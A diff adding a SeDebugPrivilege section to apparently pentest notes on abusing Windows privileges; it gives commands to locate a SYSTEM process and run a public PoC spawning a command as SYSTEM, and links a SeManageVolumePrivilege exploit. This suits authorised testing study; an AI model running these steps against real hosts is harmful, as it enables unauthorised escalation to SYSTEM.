@@ -1,4 +1,19 @@
 Collection of Abuses possible of certain privileges
+
+## SeDebugPrivilege
+Using this technique, we can elevate our privileges to SYSTEM by launching a child process and using the elevated rights granted to our account via SeDebugPrivilege to alter normal system behavior to inherit the token of a parent process and impersonate it.
+
+First, transfer this PoC script to target https://github.com/decoder-it/psgetsystem
+
+RCE as SYSTEM
+```powershell
+# identify running processes and accompanying PIDs
+tasklist  # winlogon.exe is a good one as it runs as SYSTEM on windows hosts
+
+# run script
+.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
+```
+
 ## SeManageVolumePrivilege
 	[https://github.com/CsEnox/SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)
 
